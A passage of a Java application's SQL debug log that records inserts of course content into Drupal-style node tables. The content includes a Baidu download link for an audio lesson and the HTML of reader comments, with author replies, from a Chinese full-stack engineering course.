'https://qdall01.baidupcs.com/file/e7911bdc4h88c3fa4e189d49089c9373?bkt=en-d3a65691252603d3fecc9f504bc78bd2b60e41ea93ecb93ec870c3073148257c8f9b892b6c77d77a&fid=3757516097-778750-696161537579718&time=1605754825&sign=FDTAXUGERLQlBHSKfWqir-DCb740ccc5511e5e8fedcff06b081203-3jF%2FfDK8fxD7RsFVAuyD7fUS3Z0%3D&to=92&size=9306649&sta_dx=9306649&sta_cs=1615&sta_ft=m4a&sta_ct=6&sta_mt=0&fm2=MH%2CYangquan%2CAnywhere%2C%2Cshanghai%2Cct&ctime=1576766146&mtime=1605754778&resv0=-1&resv1=0&resv2=rlim&resv3=2&resv4=9306649&vuk=3757516097&iv=0&htype=&randtype=em&newver=1&newfm=1&secfm=1&flow_ver=3&pkey=en-2b51a744225f8fc2baebef4630c320d905eb2c368996ea591714e9b67466a0c4cc2688fda075116e&sl=76480590&expires=8h&rt=pr&r=809662133&mlogid=7501918660288732089&vbdid=2247232042&fin=%E5%85%A8%E6%A0%88%E5%9B%9E%E9%A1%BE%E4%B8%A8%E6%88%90%E4%B8%BA%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%81.m4a&bflag=92,34-92&rtype=1&dp-logid=7501918660288732089&dp-callid=0.1.1&hps=1&tsl=80&csl=80&fsl=-1&csign=yVzLQPCt4DblfMLqd2BCjd2RnqQ%3D&so=0&ut=6&uter=0&serv=0&uc=1458616558&ti=c77a2290e27174be43f6bf90bbc18f8ee19a01257a999ddf305a5e1275657320&hflag=30&adg=c_15d187590626c675056c89c8026cfc17&reqlabel=778750_l_1bf9445f27094ab64c9f1cb0bdf7ccfa_-1_dd2c452b8e51a0c74130d7cf32c48a2d&ibp=1&by=themis&filename=%E5%85%A8%E6%A0%88%E5%9B%9E%E9%A1%BE%E4%B8%A8%E6%88%90%E4%B8%BA%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%85%A8%E6%A0%88%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%81.m4a', 
3, 3) 
 {executed in 1 msec}
2020-11-19 11:00:26.498 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.499 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.500 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.500 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.503 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> "全栈，不只是一种技术分类，还代表了一种态度：理性、包容、好学。"其实老师说漏了一点"整体性"，这是从开始学到课程结束给我的收获。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还记得课前必读章节的学习路径篇和老师在留言区沟通过：对于全栈弱的是编程，毕竟十年没写程序代码了，确实偏弱；学习课程的同时其实我已经在极客大学的算法训练营去修炼了一回，刚好两边同时结束。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不知不觉从教师节跟到了差不多圣诞节：总算是又坚持学完了一门功课，自己又进步了一点；谈谈个人对于课程的收获。 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.整体性：全栈其实是从程序的最初前端-&gt;后端-&gt;数据系统-&gt;web架构/操作系统-&gt;网络这么一个整体的过程，这是我在课程中看到和学到的； 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.知识性：部分内容其实其它课程又提及，不同的老师出发点不同，全栈的观点和某个专长的老师讲的又不一样； <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.针对性：这种针对性是细节，可能许多东西我们有概念可是经常会去忽略掉；程序是细节决定成败，不经意的细节可能就决定了最终的结局。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习的时光总是非常辛苦而愉快的："付出时的辛苦，收获时的喜悦"。感谢老师一路以来的分享与教诲：希望后续在老师的个人博客里面能继续交流学习，愿老师未来一切顺利，谢谢老师。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 感谢阅读和评论 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div 
class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> 
<i class="iconfont"></i> <span class="">1</span> </div> <!----> </div> </div> </div></li> 
<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/11/0b/5f/2cc4060c.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>子豪sirius</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-16 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 感谢老师为我们贡献这么一门优秀的课程，收获了很多。我工作快十年，最近也对自己的职业感到迷茫。学了课程后，发现自己有很多知识点和领域不足，平时工作也没有思考过，这篇课程很多地方启迪了。这篇课程还有很多没看懂的地方，会反复阅读，温故知新。下一步我会尝试构建自己的全栈知识体系，寻找职业的下一个目标 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/13/f9/a1/667f0b2b.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>小靓仔</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-16 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 请问老师，您说的做项目是不是就是指单纯的功能开发，而做产品就是用心去做，不只是为了单纯的完成任务，上升到另一个层次，考虑的更多 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 你可以看一下第28讲的选修课堂，做产品要比做项目包含多得多的内容，而不只是“用心”两个字而已。简单来说，做产品，需要在产品的整个生命周期做不同的工作，比如我举的这个产品维护和线上问题修复的例子，这不是做一两个项目就能覆盖得到的。再比如说，单个项目交付可能就一个月的时间，但是整个产品的生命周期可能有好几年。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/15/04/8a/59355a67.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>koko_zhk</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 全栈：海纳百川，有容乃大 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>靠人品去赢</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 绝对值回票价，但是可惜不能再追专栏，有点不舍。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 谢谢</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 感谢老师，给我们带来这么好的课程，一路跟着老师学下来，收获是真的不少，其实人生也像是做全栈，不能把自己局限在某一个范围内，勇敢的跨出自己的舒适区，向着未知去探索自己的边界，这也许就是全栈在人生上的意义吧。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/16/bc/25/1c92a90c.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>tt</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 感谢老师一路带给我的启发！ </div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> 
</div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 不客气</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 3, 3) 
 {executed in 1 msec}
2020-11-19 11:00:26.506 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.507 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.509 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/14/34/df/64e3d533.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>leslie</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> "全栈，不只是一种技术分类，还代表了一种态度：理性、包容、好学。"其实老师说漏了一点"整体性"，这是从开始学到课程结束给我的收获。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还记得课前必读章节的学习路径篇和老师在留言区沟通过：对于全栈弱的是编程，毕竟十年没写程序代码了，确实偏弱；学习课程的同时其实我已经在极客大学的算法训练营去修炼了一回，刚好两边同时结束。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不知不觉从教师节跟到了差不多圣诞节：总算是又坚持学完了一门功课，自己又进步了一点；谈谈个人对于课程的收获。 <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1.整体性：全栈其实是从程序的最初前端-&gt;后端-&gt;数据系统-&gt;web架构/操作系统-&gt;网络这么一个整体的过程，这是我在课程中看到和学到的； 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.知识性：部分内容其实其它课程又提及，不同的老师出发点不同，全栈的观点和某个专长的老师讲的又不一样； <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3.针对性：这种针对性是细节，可能许多东西我们有概念可是经常会去忽略掉；程序是细节决定成败，不经意的细节可能就决定了最终的结局。 
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习的时光总是非常辛苦而愉快的："付出时的辛苦，收获时的喜悦"。感谢老师一路以来的分享与教诲：希望后续在老师的个人博客里面能继续交流学习，愿老师未来一切顺利，谢谢老师。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 感谢阅读和评论 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div 
class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> 
<i class="iconfont"></i> <span class="">1</span> </div> <!----> </div> </div> </div></li> 
<li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/11/0b/5f/2cc4060c.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>子豪sirius</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-16 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 感谢老师为我们贡献这么一门优秀的课程，收获了很多。我工作快十年，最近也对自己的职业感到迷茫。学了课程后，发现自己有很多知识点和领域不足，平时工作也没有思考过，这篇课程很多地方启迪了。这篇课程还有很多没看懂的地方，会反复阅读，温故知新。下一步我会尝试构建自己的全栈知识体系，寻找职业的下一个目标 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/13/f9/a1/667f0b2b.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>小靓仔</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-16 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 请问老师，您说的做项目是不是就是指单纯的功能开发，而做产品就是用心去做，不只是为了单纯的完成任务，上升到另一个层次，考虑的更多 </div> 
<div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 你可以看一下第28讲的选修课堂，做产品要比做项目包含多得多的内容，而不只是“用心”两个字而已。简单来说，做产品，需要在产品的整个生命周期做不同的工作，比如我举的这个产品维护和线上问题修复的例子，这不是做一两个项目就能覆盖得到的。再比如说，单个项目交付可能就一个月的时间，但是整个产品的生命周期可能有好几年。</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/15/04/8a/59355a67.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>koko_zhk</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 全栈：海纳百川，有容乃大 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <!----> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/13/db/26/54f2c164.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>靠人品去赢</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 绝对值回票价，但是可惜不能再追专栏，有点不舍。 </div> <div class="_2r3UB1GX_0"> <span>展开</span><i 
class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 谢谢</p> 
</div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> 
<span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> 
</div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img src="https://static001.geekbang.org/account/avatar/00/0f/4d/fd/0aa0e39f.jpg" 
class="_2273kGdT_0"> <div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> 
<a>许童童</a> <!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> 
<div> <div class="_3M6kV3zb_0"> 感谢老师，给我们带来这么好的课程，一路跟着老师学下来，收获是真的不少，其实人生也像是做全栈，不能把自己局限在某一个范围内，勇敢的跨出自己的舒适区，向着未知去探索自己的边界，这也许就是全栈在人生上的意义吧。 
</div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> </div> <div class="_2xNIY4NG_0"> 
<p class="_33BLbmw4_0">作者回复: 👍</p> </div> <div class="_1w8H0ktn_0 _2A421P4G_0"> <div class="_2jsFl-X0_0"> 
<i class="iconfont"></i> <span></span> </div> <div class="_2P4B1Hdm_0"> <i class="iconfont"></i> 
<span class=""></span> </div> <!----> </div> </div> </div></li> <li class="reJj6Thl_0"><img 
src="https://static001.geekbang.org/account/avatar/00/16/bc/25/1c92a90c.jpg" class="_2273kGdT_0"> 
<div class="_2CG0SquK_0"> <div class="_304R4gla_0"> <div> <div class="_18Dng5rT_0"> <a>tt</a> 
<!----> </div> <div class="_1H1Z49Dr_0"> 2019-12-13 </div> </div> <!----> </div> <div> <div 
class="_3M6kV3zb_0"> 感谢老师一路带给我的启发！ </div> <div class="_2r3UB1GX_0"> <span>展开</span><i class="iconfont"></i> 
</div> <div class="_2xNIY4NG_0"> <p class="_33BLbmw4_0">作者回复: 不客气</p> </div> <div class="_1w8H0ktn_0 
_2A421P4G_0"> <div class="_2jsFl-X0_0"> <i class="iconfont"></i> <span></span> </div> <div 
class="_2P4B1Hdm_0"> <i class="iconfont"></i> <span class=""></span> </div> <!----> </div> 
</div> </div></li>', 0, 'full_html', 'zh-hans', 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.512 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.513 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.514 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.514 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.516 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 3, 'https://static001.geekbang.org/resource/image/1a/89/1a833841999b24e1436f5f29107fb589.jpg', 
3) 
 {executed in 1 msec}
2020-11-19 11:00:26.519 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.519 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.521 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 3, 'https://static001.geekbang.org/resource/image/1a/89/1a833841999b24e1436f5f29107fb589.jpg', 
3) 
 {executed in 0 msec}
2020-11-19 11:00:26.524 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.524 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:00:26.525 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.528 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.529 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:00:26.530 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.533 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='531972004415189' 
 {executed in 1 msec}
2020-11-19 11:00:26.533 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.534 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754826, 1) 
 {executed in 0 msec}
2020-11-19 11:00:26.535 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754826, 1) 
 {executed in 0 msec}
2020-11-19 11:00:26.535 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|4             |
|--------------|

2020-11-19 11:00:26.538 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', 'd17d89b9-9997-4888-9992-4242ccefbff5', 
4) 
 {executed in 0 msec}
2020-11-19 11:00:26.539 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', 'd17d89b9-9997-4888-9992-4242ccefbff5', 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.539 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|4             |
|--------------|

2020-11-19 11:00:26.544 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=4, revision_default=1, revision_timestamp=1605754826, 
revision_uid=1 where vid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.550 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.550 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.551 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '531972004415189', 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.556 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
